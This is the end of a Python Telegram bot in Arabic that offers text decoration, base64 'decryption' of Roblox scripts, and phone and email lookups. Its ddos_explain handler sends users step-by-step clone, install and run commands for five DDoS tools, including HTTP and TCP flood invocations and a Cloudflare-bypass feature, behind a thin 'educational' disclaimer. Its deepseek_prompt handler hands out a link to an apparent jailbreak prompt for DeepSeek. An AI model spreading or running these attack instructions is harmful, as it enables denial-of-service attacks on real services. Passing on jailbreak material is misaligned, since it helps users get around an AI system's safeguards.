        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def decorate_text(update: Update, context) -> int:
    text_to_decorate = update.message.text
    if not text_to_decorate:
        await update.message.reply_text("الرجاء إرسال النص الذي تريد زخرفته. ✨", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECORATE_TEXT

    decorated_options = [
        f"«{text_to_decorate}»", f"『{text_to_decorate}』", f"【{text_to_decorate}】",
        f"⦅{text_to_decorate}⦆", f"〘{text_to_decorate}〙", f"〚{text_to_decorate}〛",
        f"❨{text_to_decorate}❩", f"❪{text_to_decorate}❫", f"❬{text_to_decorate}❭",
        f"❰{text_to_decorate}❱", f"❲{text_to_decorate}❳", f"❴{text_to_decorate}❵",
        f"⟅{text_to_decorate}⟆", f"⟪{text_to_decorate}⟫", f"⟬{text_to_decorate}⟭",
        f"⟮{text_to_decorate}⟯", f"⦃{text_to_decorate}⦄", f"⦅{text_to_decorate}⦆",
        f"⦗{text_to_decorate}⦘", f"⦘{text_to_decorate}⦗", f"⦙{text_to_decorate}⦙",
        f"⦚{text_to_decorate}⦚", f"⦛{text_to_decorate}⦜", f"⦝{text_to_decorate}⦞",
        f"⦟{text_to_decorate}⦠", f"⦡{text_to_decorate}⦢", f"⦣{text_to_decorate}⦤",
        f"⦥{text_to_decorate}⦦", f"⦧{text_to_decorate}⦨", f"⦩{text_to_decorate}⦪"
    ]

    response_text = "اختر الزخرفة المفضلة لديك:\n\n"
    for i, option in enumerate(decorated_options):
        response_text += f"{i+1}. {option}\n"

    await update.message.reply_text(response_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def decrypt_roblox_script(update: Update, context) -> int:
    if update.message.document:
        file_id = update.message.document.file_id
        new_file = await context.bot.get_file(file_id)
        file_path = f"./{update.message.document.file_name}"
        await new_file.download_to_drive(file_path)

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                encrypted_content = f.read()

            try:
                decoded_content = base64.b64decode(encrypted_content).decode('utf-8')
                decrypted_text = "--تم فك بواسطه بوت 7X 😈\n" + decoded_content
            except Exception:
                decrypted_text = "--تم فك بواسطه بوت 7X 😈\n" + "لم يتم التعرف على التشفير أو فكه. قد يكون التشفير أقوى من المتوقع أو غير مدعوم حالياً.\n" + encrypted_content

            output_file_name = f"decrypted_{update.message.document.file_name}"
            with open(output_file_name, "w", encoding="utf-8") as f:
                f.write(decrypted_text)

            await update.message.reply_document(document=open(output_file_name, 'rb'), filename=output_file_name, caption="تم فك تشفير السكربت بنجاح (إذا كان التشفير مدعوماً). 🔓", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

        except Exception as e:
            await update.message.reply_text(f"حدث خطأ أثناء معالجة الملف: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    else:
        await update.message.reply_text("الرجاء إرسال ملف السكربت المشفر. 📄", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def analyze_phone_number(update: Update, context) -> int:
    """Analyze a phone number using numverify API"""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📱 الرجاء إرسال رقم الهاتف للتحليل (مع رمز الدولة، مثال: +966501234567):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )
    return GETTING_PHONE_NUMBER

async def analyze_email(update: Update, context) -> int:
    """Analyze an email address"""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📧 الرجاء إرسال البريد الإلكتروني للتحليل (مثال: example@gmail.com):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )
    return GETTING_EMAIL_ADDRESS

async def get_phone_analysis(update: Update, context) -> int:
    """Process phone number analysis"""
    phone_number = update.message.text.strip()
    
    if not phone_number:
        await update.message.reply_text(
            "❌ الرجاء إرسال رقم هاتف صحيح.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
        return GETTING_PHONE_NUMBER
    
    try:
        # Use numverify API (free tier)
        if NUMVERIFY_API_KEY != "YOUR_API_KEY":
            # Premium API - more accurate
            response = requests.get(
                f"https://apilayer.net/api/validate",
                params={
                    'access_key': NUMVERIFY_API_KEY,
                    'number': phone_number,
                    'format': 1
                }
            )
            response.raise_for_status()
            data = response.json()
            
            if data.get('valid'):
                result = f"""
📱 **تحليل رقم الهاتف**

📞 الرقم: `{data.get('number', 'غير معروف')}`
🌍 الدولة: {data.get('country_name', 'غير معروف')}
🔢 رمز الدولة: +{data.get('country_code', 'غير معروف')}
📍 الموقع: {data.get('location', 'غير معروف')}
📶 النوع: {data.get('line_type', 'غير معروف')}
📡 الشركة: {data.get('carrier', 'غير معروف')}
✅ صحة الرقم: {'صحيح ✅' if data.get('valid') else 'غير صحيح ❌'}

📊 **معلومات إضافية:**
• رمز الاتصال الدولي: {data.get('international_format', 'غير معروف')}
• الرقم المحلي: {data.get('local_format', 'غير معروف')}
"""
            else:
                result = f"""
❌ **تحليل رقم الهاتف**

📞 الرقم: `{phone_number}`
✅ صحة الرقم: غير صحيح ❌

⚠️ الرقم غير صالح أو غير موجود في قاعدة البيانات.
"""
            
            await update.message.reply_text(result, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        
        else:
            # Free alternative - Simple validation using regex and country detection
            # Remove all non-digit characters
            clean_number = re.sub(r'[^\d+]', '', phone_number)
            
            # Simple validation
            is_valid = len(clean_number) >= 7 and len(clean_number) <= 15
            
            # Detect country code (simple mapping)
            country_codes = {
                '+1': 'الولايات المتحدة/كندا',
                '+44': 'المملكة المتحدة',
                '+966': 'السعودية',
                '+971': 'الإمارات',
                '+974': 'قطر',
                '+965': 'الكويت',
                '+968': 'عمان',
                '+973': 'البحرين',
                '+962': 'الأردن',
                '+961': 'لبنان',
                '+972': 'فلسطين',
                '+20': 'مصر',
                '+212': 'المغرب',
                '+216': 'تونس',
                '+213': 'الجزائر',
                '+218': 'ليبيا',
                '+222': 'موريتانيا',
                '+249': 'السودان',
                '+252': 'الصومال',
                '+253': 'جيبوتي',
                '+269': 'جزر القمر',
                '+90': 'تركيا',
                '+91': 'الهند',
                '+92': 'باكستان',
                '+94': 'سريلانكا',
                '+95': 'ميانمار',
                '+60': 'ماليزيا',
                '+62': 'إندونيسيا',
                '+63': 'الفلبين',
                '+64': 'نيوزيلندا',
                '+65': 'سنغافورة',
                '+66': 'تايلاند',
                '+81': 'اليابان',
                '+82': 'كوريا الجنوبية',
                '+84': 'فيتنام',
                '+86': 'الصين',
                '+880': 'بنغلاديش',
                '+977': 'نيبال',
                '+98': 'إيران',
                '+93': 'أفغانستان',
                '+7': 'روسيا',
                '+30': 'اليونان',
                '+31': 'هولندا',
                '+32': 'بلجيكا',
                '+33': 'فرنسا',
                '+34': 'إسبانيا',
                '+36': 'هنغاريا',
                '+39': 'إيطاليا',
                '+40': 'رومانيا',
                '+41': 'سويسرا',
                '+45': 'الدنمارك',
                '+46': 'السويد',
                '+47': 'النرويج',
                '+48': 'بولندا',
                '+49': 'ألمانيا',
                '+351': 'البرتغال',
                '+352': 'لوكسمبورغ',
                '+353': 'أيرلندا',
                '+354': 'آيسلندا',
                '+356': 'مالطا',
                '+357': 'قبرص',
                '+358': 'فنلندا',
                '+359': 'بلغاريا',
                '+370': 'ليتوانيا',
                '+371': 'لاتفيا',
                '+372': 'إستونيا',
                '+373': 'مولدوفا',
                '+374': 'أرمينيا',
                '+375': 'بيلاروسيا',
                '+376': 'أندورا',
                '+377': 'موناكو',
                '+378': 'سان مارينو',
                '+380': 'أوكرانيا',
                '+381': 'صربيا',
                '+382': 'الجبل الأسود',
                '+385': 'كرواتيا',
                '+386': 'سلوفينيا',
                '+387': 'البوسنة والهرسك',
                '+389': 'مقدونيا',
                '+420': 'جمهورية التشيك',
                '+421': 'سلوفاكيا',
                '+423': 'ليختنشتاين',
                '+43': 'النمسا',
                '+500': 'جزر فوكلاند',
                '+501': 'بليز',
                '+502': 'غواتيمالا',
                '+503': 'السلفادور',
                '+504': 'هندوراس',
                '+505': 'نيكاراغوا',
                '+506': 'كوستاريكا',
                '+507': 'بنما',
                '+508': 'سانت بيير وميكلون',
                '+509': 'هايتي',
                '+51': 'بيرو',
                '+52': 'المكسيك',
                '+53': 'كوبا',
                '+54': 'الأرجنتين',
                '+55': 'البرازيل',
                '+56': 'تشيلي',
                '+57': 'كولومبيا',
                '+58': 'فنزويلا',
                '+591': 'بوليفيا',
                '+592': 'غيانا',
                '+593': 'الإكوادور',
                '+595': 'باراغواي',
                '+596': 'مارتينيك',
                '+597': 'سورينام',
                '+598': 'أوروغواي',
                '+61': 'أستراليا',
                '+670': 'تيمور الشرقية',
                '+672': 'القارة القطبية الجنوبية',
                '+673': 'بروناي',
                '+674': 'ناورو',
                '+675': 'بابوا غينيا الجديدة',
                '+676': 'تونغا',
                '+677': 'جزر سليمان',
                '+678': 'فانواتو',
                '+679': 'فيجي',
                '+680': 'بالاو',
                '+681': 'والس وفوتونا',
                '+682': 'جزر كوك',
                '+683': 'نيوي',
                '+685': 'ساموا',
                '+686': 'كيريباتي',
                '+687': 'كاليدونيا الجديدة',
                '+688': 'توفالو',
                '+689': 'بولينيزيا الفرنسية',
                '+690': 'توكيلاو',
                '+691': 'ولايات ميكرونيزيا الموحدة',
                '+692': 'جزر مارشال',
                '+856': 'لاوس',
                '+855': 'كمبوديا',
            }
            
            # Find country code
            country = "غير معروف"
            country_code = "غير معروف"
            for code, name in country_codes.items():
                if clean_number.startswith(code):
                    country = name
                    country_code = code.replace('+', '')
                    break
            
            result = f"""
📱 **تحليل رقم الهاتف** (تحليل أساسي - مجاني)

📞 الرقم: `{clean_number}`
🌍 الدولة: {country}
🔢 رمز الدولة: +{country_code}
✅ صحة الرقم: {'صحيح ✅' if is_valid else 'غير صحيح ❌'}

⚠️ **ملاحظة:** هذا تحليل أساسي مجاني. للحصول على تحليل دقيق (النوع، الشركة، الموقع)، يرجى الحصول على مفتاح API مجاني من apilayer.com
"""
            
            await update.message.reply_text(result, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(
            f"❌ حدث خطأ أثناء الاتصال بـ API: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    except Exception as e:
        await update.message.reply_text(
            f"⚠️ حدث خطأ غير متوقع: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    return CHOOSING_MAIN_MENU

async def get_email_analysis(update: Update, context) -> int:
    """Process email analysis"""
    email = update.message.text.strip()
    
    if not email or '@' not in email:
        await update.message.reply_text(
            "❌ الرجاء إرسال بريد إلكتروني صحيح (مثال: example@gmail.com).",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
        return GETTING_EMAIL_ADDRESS
    
    try:
        # Parse email
        local_part, domain = email.split('@')
        
        # Check domain validity using DNS
        is_valid = False
        domain_status = "غير معروف"
        disposable = False
        email_provider = "غير معروف"
        
        # List of common email providers
        providers = {
            'gmail.com': 'Google Gmail',
            'yahoo.com': 'Yahoo Mail',
            'yahoo.fr': 'Yahoo Mail',
            'yahoo.co.uk': 'Yahoo Mail',
            'outlook.com': 'Microsoft Outlook',
            'hotmail.com': 'Microsoft Hotmail',
            'live.com': 'Microsoft Live',
            'msn.com': 'Microsoft MSN',
            'icloud.com': 'Apple iCloud',
            'me.com': 'Apple Me',
            'mac.com': 'Apple Mac',
            'aol.com': 'AOL Mail',
            'protonmail.com': 'ProtonMail',
            'protonmail.ch': 'ProtonMail',
            'tutanota.com': 'Tutanota',
            'tutanota.de': 'Tutanota',
            'mail.com': 'Mail.com',
            'gmx.com': 'GMX',
            'gmx.de': 'GMX',
            'web.de': 'Web.de',
            'yandex.com': 'Yandex Mail',
            'yandex.ru': 'Yandex Mail',
            'zoho.com': 'Zoho Mail',
            'fastmail.com': 'FastMail',
            'hey.com': 'HEY',
            'skiff.com': 'Skiff',
            'startmail.com': 'StartMail',
            'posteo.de': 'Posteo',
            'mailbox.org': 'Mailbox.org',
            'disroot.org': 'Disroot',
            'riseup.net': 'Riseup',
            'autistici.org': 'Autistici',
            'inventati.org': 'Inventati',
            'keemail.me': 'Keemail',
            'email.com': 'Email.com',
            'usa.com': 'USA.com',
            'europe.com': 'Europe.com',
            'asia.com': 'Asia.com',
            'africa.com': 'Africa.com',
            'australia.com': 'Australia.com',
        }
        
        # List of disposable email domains (temporary email)
        disposable_domains = [
            'tempmail.com', '10minutemail.com', 'guerrillamail.com', 'mailinator.com',
            'trashmail.com', 'spamgourmet.com', 'throwawayemail.com', 'temp-mail.org',
            'getnada.com', 'yopmail.com', 'mailnesia.com', 'spambox.us', 'tempinbox.com',
            'trash2009.com', 'mailnator.com', 'guerrillamail.org', 'tempmail.io',
            'dispostable.com', 'fakeinbox.com', 'maildrop.cc', 'temporary-email.com',
            'mintemail.com', 'mailmetrash.com', 'spamvoid.com', 'trash2009.net',
            'spam.la', 'mailexpire.com', 'spamtrap.co', 'mailtrap.io', 'fake-mail.net',
            'mailcatch.com', 'fakemailgenerator.com', 'inboxbear.com', 'smailpro.com',
            'tempmail.us', 'guerrillamail.info', 'tempemail.co', 'trashmail.net',
            'spambox.net', 'mailismagic.com', 'spamdecoy.net', 'mailinbox.co',
            'tempr.email', 'fakemail.net', 'throwawaymail.com', 'guerrillamail.biz',
            'mailinator2.com', 'trash2009.org', 'spamday.com', 'mailswipe.net',
            'temp-mail.net', '10minutemail.net', 'guerrillamail.net', 'spamthis.com',
            'trash2009.info', 'spamail.net', 'mailinator.net', 'tempinbox.co',
            'guerrillamail.co.uk', 'throwawaymail.net', 'spambox.org', 'mailnator.net',
            'tempmail.co.uk', 'disposablemail.com', 'fakeinbox.net', 'maildrop.org',
            'temporarymail.com', 'spam404.com', 'trash2009.biz', 'mailmetrash.com',
        ]
        
        # Check if it's a disposable domain
        if domain in disposable_domains:
            disposable = True
        
        # Check if it's a known provider
        if domain in providers:
            email_provider = providers[domain]
        
        # Try to check domain MX records
        try:
            import dns.resolver
            mx_records = dns.resolver.resolve(domain, 'MX')
            if mx_records:
                is_valid = True
                domain_status = "نشط ✅"
            else:
                domain_status = "غير نشط ❌"
        except:
            # If DNS lookup fails, try to resolve A record
            try:
                import dns.resolver
                a_records = dns.resolver.resolve(domain, 'A')
                if a_records:
                    is_valid = True
                    domain_status = "نشط ✅"
                else:
                    domain_status = "غير نشط ❌"
            except:
                domain_status = "تعذر التحقق ⚠️"
                # If we can't verify, assume it might be valid if it has a dot and common format
                if '.' in domain and len(domain) > 3:
                    is_valid = True
        
        # Build result
        result = f"""
📧 **تحليل البريد الإلكتروني**

📌 البريد: `{email}`
✅ صحة الإيميل: {'صحيح ✔️' if is_valid else 'غير صحيح ❌'}
📡 مزود البريد: {email_provider}
🗑️ بريد مؤقت: {'نعم 🗑️' if disposable else 'لا ✅'}
🌐 حالة الدومين: {domain_status}

📊 **معلومات إضافية:**
• الجزء المحلي: `{local_part}`
• النطاق: `{domain}`
• طول البريد: {len(email)} حرف
• @ موجود: نعم

⚠️ **ملاحظة:** هذا التحليل أساسي. قد لا يكون دقيقاً 100%.
"""
        
        await update.message.reply_text(result, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        
    except Exception as e:
        await update.message.reply_text(
            f"⚠️ حدث خطأ أثناء تحليل البريد الإلكتروني: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    return CHOOSING_MAIN_MENU

async def ddos_explain(update: Update, context) -> None:
    """Show DDOS tools explanation"""
    query = update.callback_query
    await query.answer()
    
    text = """
🛠️ **شرح أدوات DDOS (لأغراض تعليمية فقط)**

---

**🛠️ 1. MHDDoS - أشمل أداة متعددة الطبقات**

هذه الأداة تعتبر من أشهر وأقوى الأدوات، وتدعم أكثر من 56 طريقة هجوم مختلفة، وتعمل على جميع الأنظمة بما في ذلك Termux على الأندرويد. 

· **المميزات:** تدعم الطبقات السابعة (Layer 7) مثل هجمات HTTP و Cloudflare Bypass، والطبقة الرابعة (Layer 4) مثل SYN و UDP Floods، وأدوات مساعدة لاكتشاف IP الحقيقي .
· **رابط الأداة:** https://github.com/MatrixTM/MHDDoS
· **طريقة التشغيل:**
  1. استنساخ المستودع: git clone https://github.com/MatrixTM/MHDDoS.git
  2. الدخول إلى المجلد: cd MHDDoS
  3. تثبيت المتطلبات: pip install -r requirements.txt
  4. تشغيل الهجوم (مثال): python3 start.py GET https://example.com 100 60 حيث 100 عدد الخيوط و 60 المدة بالثواني .

---

**🛠️ 2. Typhon - أداة متقدمة للطبقات الثلاث**

أداة قوية ومتخصصة لاختبار الضغط على الشبكات، وتتميز بقدرتها على تنفيذ هجمات على الطبقات الثالثة والرابعة والسابعة مع دعم أدوات استطلاع متقدمة .

· **المميزات:** هجمات HTTP/HTTPS عالية السرعة باستخدام asyncio، فيضانات UDP و TCP قوية، وأداة "Origin Finder" لاكتشاف IP الخادم الحقيقي .
· **رابط الأداة:** https://github.com/G0odKid/Typhon
· **طريقة التشغيل:**
  1. استنساخ المستودع: git clone https://github.com/G0odKid/Typhon
  2. الدخول إلى المجلد: cd Typhon
  3. تثبيت المتطلبات: pip install -r requirements.txt
  4. هجوم الطبقة السابعة (مثال): python main.py stress -u https://example.com -t 500 -r 1000 (-t عدد المهام، -r عدد الطلبات) .
  5. هجوم الطبقة الرابعة (مثال): python main.py flood -ip 192.168.1.100 -p 80 -t 200 -d 300 --method tcp .

---

**🛠️ 3. ddos_tool_2025 - إطار عمل شامل مع تجاوز للحماية**

إطار عمل مفتوح المصدر مصمم خصيصاً للاختبارات الأخلاقية، ويدعم تقنيات تجاوز الحماية مثل Cloudflare .

· **المميزات:** هجمات متعددة الطبقات (L3/L4/L7)، تقنيات مضخمة (Amplification)، وواجهة سطر أوامر سهلة الاستخدام .
· **رابط الأداة:** https://github.com/infocyn/ddos-2025
· **طريقة التشغيل:**
  1. استنساخ المستودع: git clone https://github.com/infocyn/ddos-2025.git
  2. الدخول إلى المجلد: cd ddos-2025
  3. تثبيت المتطلبات: pip install -r requirements.txt
  4. تشغيل الأداة: python main.py، ثم اختيار نوع الهجوم من القائمة (مثل 3 لـ HTTP Flood) وإدخال المعلومات المطلوبة .

---

**🛠️ 4. FAST-DDoS - أداة سريعة ومتعددة الأساليب**

هذه الأداة مختلفة لأنها مكتوبة بلغة Bash، مما يجعلها خفيفة جداً وسريعة على أنظمة لينكس .

· **المميزات:** تستهدف خدمات محددة مثل ماينكرافت، PSN، XBOX، تدعم هجمات التضخيم (Amplification)، ولا تحتاج إلى تثبيت بايثون، فقط تعتمد على أدوات nmap و hping3 .
· **رابط الأداة:** https://github.com/rickroll747/FAST-DDoS
· **طريقة التشغيل:**
  1. تثبيت المتطلبات: sudo apt install nmap hping3
  2. استنساخ المستودع: git clone https://github.com/rickroll747/FAST-DDoS
  3. الدخول إلى المجلد: cd FAST-DDoS
  4. منح الصلاحيات: chmod +x FAST-DDoS.sh
  5. التشغيل بصلاحيات المدير: sudo ./FAST-DDoS.sh .

---

**🛠️ 5. NS-X-DDOS - محرك احترافي للاختبار**

محرك متعدد الخيوط عالي الأداء، مصمم للأغراض التعليمية واختبار الحمل، ويعمل على جميع الأنظمة بما في ذلك Termux .

· **المميزات:** يدعم طلبات HTTPS، واجهة غنية بالمعلومات، إعدادات متقدمة للتحكم في شدة الهجوم، متوافق مع ويندوز، لينكس، ماك، وTermux .
· **رابط الأداة:** https://github.com/naborajs/NS-X-DDOS
· **طريقة التشغيل:**
  1. استنساخ المستودع: git clone https://github.com/naborajs/NS-X-DDOS.git
  2. الدخول إلى المجلد: cd NS-X-DDOS
  3. تثبيت المتطلبات: pip install -r requirements.txt
  4. تشغيل الأداة: python nsx.py، ثم اتباع التعليمات لتحديد الهدف وشدة الهجوم .

---

⚠️ **تنويه قانوني وأخلاقي مهم**

جميع هذه الأدوات صُنعت لأغراض تعليمية واختبار أمني في بيئات مرخصة. استخدامها على أطراف ثالثة دون إذن صريح يُعتبر جريمة إلكترونية في جميع الدول تقريباً ويعرضك لعقوبات قانونية صارمة. المسؤولية القانونية والأخلاقية تقع عليك بالكامل.
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def deepseek_prompt(update: Update, context) -> None:
    """Show DeepSeek prompt link"""
    query = update.callback_query
    await query.answer()
    
    text = """
😈 **برومبت ديبسيك**

انسخ هذا الرابط وأعطه لـ DeepSeek واستمتع!

🔗 **رابط البرومبت:**
https://pastefy.app/EM31V8rs/raw


⚠️ **إخلاء مسؤولية:** 
أنا أخلّي مسؤوليتي عن أي استخدام خاطئ لهذا البرومبت. استخدام هذا البرومبت يكون تحت مسؤوليتك الشخصية الكاملة.
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def cancel(update: Update, context) -> int:
    await update.message.reply_text(
        "تم إلغاء العملية. يمكنك البدء من جديد باستخدام /start.", reply_markup=main_menu_reply_markup
    )
    return ConversationHandler.END

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSING_MAIN_MENU: [
                CallbackQueryHandler(button, pattern='^(?!main_menu$).*'),
                CallbackQueryHandler(main_menu, pattern='^main_menu$')
            ],
            GETTING_WEBSITE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_website_html)],
            GETTING_IP_INFO_QUERY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ip_info)],
            GETTING_TELEGRAM_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, search_telegram_user)],
            GETTING_ROBLOX_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_roblox_account_info)],
            GETTING_DECORATE_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, decorate_text)],
            GETTING_DECRYPT_ROBLOX_SCRIPT: [MessageHandler(filters.Document.ALL, decrypt_roblox_script)],
            GETTING_CHECK_LINK_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_link)],
            GETTING_PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_analysis)],
            GETTING_EMAIL_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email_analysis)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(main_menu, pattern='^main_menu$')],
        per_message=False
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
